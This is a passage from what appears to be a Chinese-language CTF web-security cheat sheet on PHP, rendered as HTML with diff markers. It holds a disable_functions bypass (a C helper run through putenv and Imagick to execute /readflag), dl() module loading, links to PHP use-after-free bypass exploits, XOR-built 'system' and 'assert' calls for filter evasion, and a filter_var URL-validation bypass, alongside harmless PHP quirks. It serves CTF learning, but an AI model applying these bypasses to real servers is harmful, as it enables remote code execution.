+<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
+    unsetenv(<span class="hljs-string">"PATH"</span>);
+    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* cmd = getenv(<span class="hljs-string">"CMD"</span>);
+    system(cmd);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<pre><code class="hljs php">putenv(<span class="hljs-string">'PATH=/tmp/mydir'</span>);
+putenv(<span class="hljs-string">'CMD=/readflag &gt; /tmp/mydir/output'</span>);
+chmod(<span class="hljs-string">'/tmp/mydir/gs'</span>,<span class="hljs-string">'0777'</span>);
+$img = <span class="hljs-keyword">new</span> Imagick(<span class="hljs-string">'/tmp/mydir/1.ept'</span>);
+</code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p>dl()</p>
+<ul>
+<li>載入module</li>
+<li>
+<code>dl(&quot;rce.so&quot;)</code>
+</li>
+</ul>
+</li>
+<li>
+<p>FFI</p>
+<ul>
+<li>PHP 7.4 feature</li>
+<li>preloading + ffi</li>
+<li>e.g. RCTF 2019 - nextphp</li>
+</ul>
+</li>
+<li>
+<p><a href="https://github.com/w181496/FuckFastcgi" class="Link--external" rel="noopener noreferrer">Extension</a></p>
+</li>
+<li>
+<p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" class="Link--external" rel="noopener noreferrer">l3mon/Bypass_Disable_functions_Shell</a></p>
+</li>
+<li>
+<p><a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass" class="Link--external" rel="noopener noreferrer">JSON UAF Bypass</a></p>
+<ul>
+<li>7.1 - all versions to date</li>
+<li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li>
+<li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li>
+</ul>
+</li>
+<li>
+<p><a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" class="Link--external" rel="noopener noreferrer">GC Bypass</a></p>
+<ul>
+<li>7.0 - all versions to date</li>
+<li>7.1 - all versions to date</li>
+<li>7.2 - all versions to date</li>
+<li>7.3 - all versions to date</li>
+</ul>
+</li>
+<li>
+<p>族繁不及備載……</p>
+</li>
+</ul>
+<h2 id="page_qi_ta">其他</h2>
+<ul>
+<li>
+<p>大小寫不敏感 <code>&lt;?PhP sYstEm(ls);</code></p>
+</li>
+<li>
+<p>Array Bracket <code>$array[87] === $array{87}</code></p>
+</li>
+<li>
+<p>Double Quote Evaluation</p>
+<ul>
+<li>
+<code>$msg = &quot;hello, $name&quot;</code>
+</li>
+<li>
+<code>$msg = &quot;${@phpinfo()}&quot;</code>
+</li>
+</ul>
+</li>
+<li>
+<p><code>echo (true ? 'a' : false ? 'b' : 'c');</code></p>
+<ul>
+<li>
+<code>b</code>
+</li>
+</ul>
+</li>
+<li>
+<p><code>echo `whoami`; </code></p>
+<ul>
+<li>
+<code>kaibro</code>
+</li>
+</ul>
+</li>
+<li>
+<p>正規表達式<code>.</code>不匹配換行字元<code>%0a</code></p>
+</li>
+<li>
+<p>正規表達式常見誤用:</p>
+<ul>
+<li>
+<code>preg_match(&quot;/\\/&quot;, $str)</code>
+</li>
+<li>匹配反斜線應該要用<code>\\\\</code>而不是<code>\\</code>
+</li>
+</ul>
+</li>
+<li>
+<p>運算優先權問題</p>
+<ul>
+<li>
+<code>$a = true &amp;&amp; false;</code>
+<ul>
+<li>
+<code>$a</code> =&gt; <code>false</code>
+</li>
+</ul>
+</li>
+<li>
+<code>$a = true and false;</code>
+<ul>
+<li>
+<code>$a</code> =&gt; <code>true</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>chr()</p>
+<ul>
+<li>大於256會mod 256</li>
+<li>小於0會加上256的倍數，直到&gt;0</li>
+<li>Example:
+<ul>
+<li>
+<code>chr(259) === chr(3)</code>
+</li>
+<li>
+<code>chr(-87) === chr(169)</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>遞增</p>
+<ul>
+<li>
+<code>$a=&quot;9D9&quot;; var_dump(++$a);</code>
+<ul>
+<li>
+<code>string(3) &quot;9E0&quot;</code>
+</li>
+</ul>
+</li>
+<li>
+<code>$a=&quot;9E0&quot;; var_dump(++$a);</code>
+<ul>
+<li>
+<code>float(10)</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>算數運算繞Filter</p>
+<ul>
+<li>
+<code>%f3%f9%f3%f4%e5%ed &amp; %7f%7f%7f%7f%7f%7f</code>
+<ul>
+<li>
+<code>system</code>
+</li>
+<li>可用在限制不能出現英數字時 or 過濾某些特殊符號</li>
+</ul>
+</li>
+<li>
+<code>$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');</code>
+<ul>
+<li>
+<code>assert</code>
+</li>
+</ul>
+</li>
+<li>其他
+<ul>
+<li>
+<code>~</code>, <code>++</code>等運算，也都可用類似概念構造</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>花括號</p>
+<ul>
+<li>陣列、字串元素存取可用花括號</li>
+<li>
+<code>$array{index}</code>同<code>$array[index]</code>
+</li>
+</ul>
+</li>
+<li>
+<p>filter_var</p>
+<ul>
+<li>
+<code>filter_var('http://evil.com;google.com', FILTER_VALIDATE_URL)</code>
+<ul>
+<li>False</li>
+</ul>
+</li>
+<li>
+<code>filter_var('0://evil.com;google.com', FILTER_VALIDATE_URL)</code>
+<ul>
+<li>True</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>json_decode</p>
+<ul>
+<li>不直接吃換行字元和\t字元</li>
+<li>但可以吃’\n’和’\t’
+<ul>
+<li>會轉成換行字元和Tab</li>
+</ul>
+</li>
+<li>也吃<code>\uxxxx</code>形式
+<ul>
+<li>
+<code>json_decode('{&quot;a&quot;:&quot;\u0041&quot;}')</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>===</code> bug</p>
+<ul>
+<li>
+<code>var_dump([0 =&gt; 0] === [0x100000000 =&gt; 0])</code>
+<ul>
+<li>某些版本會是True</li>
+<li>ASIS 2018 Qual Nice Code</li>
+</ul>
+</li>
+<li>https://3v4l.org/sUEMG</li>
+</ul>
+</li>
+<li>
+<p>openssl_verify</p>
+<ul>
+<li>預測採用SHA1來做簽名，可能有SHA1 Collision問題</li>
+<li>DEFCON CTF 2018 Qual</li>
+</ul>
+</li>
+<li>
+<p>Namespace</p>
+<ul>
+<li>PHP的預設Global space是<code>\</code>
+</li>
+<li>e.g. <code>\system('ls');</code>
+</li>
+</ul>
+</li>
+</ul>
+    </div>
 
         <nav>
         <ul class="Pager">
